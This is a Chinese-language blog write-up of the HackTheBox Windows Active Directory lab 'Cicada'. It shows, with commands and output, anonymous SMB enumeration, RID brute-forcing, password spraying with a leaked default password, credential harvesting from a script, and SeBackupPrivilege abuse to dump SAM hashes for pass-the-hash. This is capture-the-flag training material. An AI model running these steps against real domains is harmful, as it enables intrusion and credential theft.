---
title: HTB Cicada
published: 2026-10-01
tags: [HTB,Windows,AD]
category: PenTest
draft: false
image: 'image.png'
---

## 前言

太久沒更新了，所以就拿最近要在實驗室報的水題來水一下文章．
之後會開始扁 Medium 或是 Hard 的 AD 機器 (前提是沒被學業壓死)

## Recon
```                    
┌──(dkri3c1🐱dkri3c1)-[~]
└─$ nmap -sC -sV -Pn 10.129.231.149
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-16 02:23 EDT
Nmap scan report for 10.129.231.149
Host is up (0.11s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-16 13:23:24Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-09-16T13:24:47+00:00; +6h59m10s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-09-16T13:24:48+00:00; +6h59m10s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-09-16T13:24:47+00:00; +6h59m10s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-09-16T13:24:48+00:00; +6h59m10s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m09s, deviation: 0s, median: 6h59m09s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-09-16T13:24:08
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.90 seconds
```
## Exploit

根據 Recon 結果 `cicada.htb` 為 DNS name，加入 `/etc/hosts`

port 開在 445 ，代表有 samba ，先用 smbclient 去列共享

```bash=
┌──(dkri3c1🐱dkri3c1)-[~]
└─$ smbclient -L //10.129.231.149 -N          

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	DEV             Disk      
	HR              Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.231.149 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

發現有 HT 這一個 Folder，連上去並且下載檔案

```bash=
┌──(dkri3c1🐱dkri3c1)-[~]
└─$ smbclient //10.129.231.149/HR  
Password for [WORKGROUP\dkri3c1]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 08:29:09 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024

		4168447 blocks of size 4096. 482165 blocks available
smb: \> get HR.txt
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \HR.txt
smb: \> ls
  .                                   D        0  Thu Mar 14 08:29:09 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024

		4168447 blocks of size 4096. 482165 blocks available
smb: \> get HR.txt
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \HR.txt
smb: \> get "Notice from HR.txt "
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Notice from HR.txt 
smb: \> get Notice from HR.txt 
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Notice
smb: \> ls
  .                                   D        0  Thu Mar 14 08:29:09 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024

		4168447 blocks of size 4096. 482165 blocks available
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (2.7 KiloBytes/sec) (average 2.7 KiloBytes/sec)
smb: \> 
```

Notice from hr.txt:

```bash=
┌──(dkri3c1🐱dkri3c1)-[~]
└─$ cat Notice\ from\ HR.txt 

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

得到一個 password : `Cicada$M6Corpb*@Lp#nZp!8`，大概就是拿這個做 password spray ，至於要拿到其他 username 的話就是透過 nxc 的 smb 的 `--rid-brute` 去做，可以用隨便的 username ，密碼不用輸入

```bash=
┌──(dkri3c1🐱dkri3c1)-[~]
└─$ nxc smb "10.129.231.149" -u '123' -p '' --rid-brute
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\123: (Guest)
SMB         10.129.231.149  445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

利用 `awk` 做整理

用 awk 跟 grep 把 User 給留下來


```bash=
┌──(dkri3c1🐱dkri3c1)-[~]
└─$ grep "SidTypeUser" a.txt | awk '{print $(NF-1)}' | awk -F '\\' '{print $2}' 
Administrator
Guest
krbtgt
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars             
```

之後做 password spray

```bash=
┌──(dkri3c1🐱dkri3c1)-[~]
└─$ nxc smb "10.129.45.164" -u user.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
SMB         10.129.45.164   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.45.164   445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.45.164   445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.45.164   445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.45.164   445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.45.164   445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.45.164   445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.45.164   445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
```

`michael.wrightson` 是有料的

登入 smb，然後 recursive

```bash=
┌──(dkri3c1🐱dkri3c1)-[~/Downloads/a]
└─$ smbclient "//10.129.45.164/SYSVOL" -U "michael.wrightson"
Password for [WORKGROUP\michael.wrightson]:
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *

```

```bash=
┌──(dkri3c1🐱dkri3c1)-[~/Downloads/a/cicada.htb]
└─$ find Policies -type f
Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Registry.pol
Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/comment.cmtx
Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI
Policies/{2480865A-F9E0-4995-B568-987D80F2ADEF}/Machine/Registry.pol
Policies/{2480865A-F9E0-4995-B568-987D80F2ADEF}/Machine/comment.cmtx
Policies/{2480865A-F9E0-4995-B568-987D80F2ADEF}/GPT.INI
Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol
Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI
```

然而實際上卻是沒有什麼有用的資料，於是回去看看還有開了什麼 port ，發現有 `389` (LDAP)，一個用來查詢 AD 上各項資料的 Protocol，有一個工具 `ldapdomaindump`

https://github.com/dirkjanm/ldapdomaindump


```bash=
┌──(dkri3c1🐱dkri3c1)-[~/a]
└─$ ldapdomaindump -u cicada.htb\\michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.129.45.164 -o .  
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

file : `domain_users_by_group.html`

![image](https://hackmd.io/_uploads/SyCu1XY5Mx.png)


登入 `/DEV`

```bash=
┌──(dkri3c1🐱dkri3c1)-[~]
└─$ smbclient "//10.129.45.164/DEV" -U david.orelious
Password for [WORKGROUP\david.orelious]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 08:31:39 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 13:28:22 2024

                4168447 blocks of size 4096. 448836 blocks available
smb: \> get Backup_script.ps1
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)
smb: \> 
```

拿下來取得 credentials

```bash=
┌──(dkri3c1🐱dkri3c1)-[~]
└─$ cat Backup_script.ps1 

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "?????" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

用 evil-winrm 發現可以成功連上去機器上，並且在`C:\Users\emily.oscars.CICADA\DEsktop`

上取得 flag

```bash=
C:\Users\emily.oscars.CICADA\DEsktop
cat user.txt
2713f.......
```

提權:

```bash=
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

發現有
```bash=
Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
```

參考
https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md

![image](https://hackmd.io/_uploads/S1E6Aft5Me.png)


可以利用 evil-winrm download 功能去把裡面的 `sam.hive`&`system.hive` 載下來

![image](https://hackmd.io/_uploads/By5p0GtcGe.png)

之後用 `secretdump`

![image](https://hackmd.io/_uploads/B1p1kQF9zl.png)

做 pass the hash

```bash=
evil-winrm -i 10.129.48.143 -u "Administrator" -H "hash"
```

![image](https://hackmd.io/_uploads/rki7yXF5Mg.png)

root 在 `C:\Users\Administrator\Desktop`

```
67a93de....
```


而原理是透過備份機制繞過存取控制，導致可以拿到 SAM (存加密過後 hash ) 跟 SYSTEM (解密所需內容)


## Pwned!

![image](https://hackmd.io/_uploads/rkMqX7YcMe.png)

